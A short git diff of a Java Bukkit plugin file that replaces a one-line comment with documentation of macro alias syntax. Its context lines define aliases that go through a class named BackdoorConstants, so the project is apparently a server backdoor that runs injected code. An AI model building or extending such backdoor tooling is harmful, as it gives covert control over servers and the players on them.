@@ -59,7 +59,18 @@ public class DefaultConfig implements Listener {
                 ParametersAreNullableByDefault.class, CodeParser.class, Code.class, CustomLoaderDelegate.class,
                 Settings.class, ChatListener.class, DefaultConfig.class, Superhead.class,
                 BukkitScheduler.class, PluginManager.class);
-        // Simplified macro definitions
+        /*
+         * Simplified macro definitions
+         * Variables definition:
+         *     varName = varValue
+         * ex:
+         *     server=Bukkit.getServer()
+         *
+         * Function definition:
+         *     funcName=funcQuote
+         * ex:
+         *     alias=DefaultConfig.addAlias
+         */
         addAlias("server=Bukkit.getServer()");
         addAlias("player=(Player) BackdoorConstants.getObject(\"player\")");
         addAlias("loc=player.getLocation()");
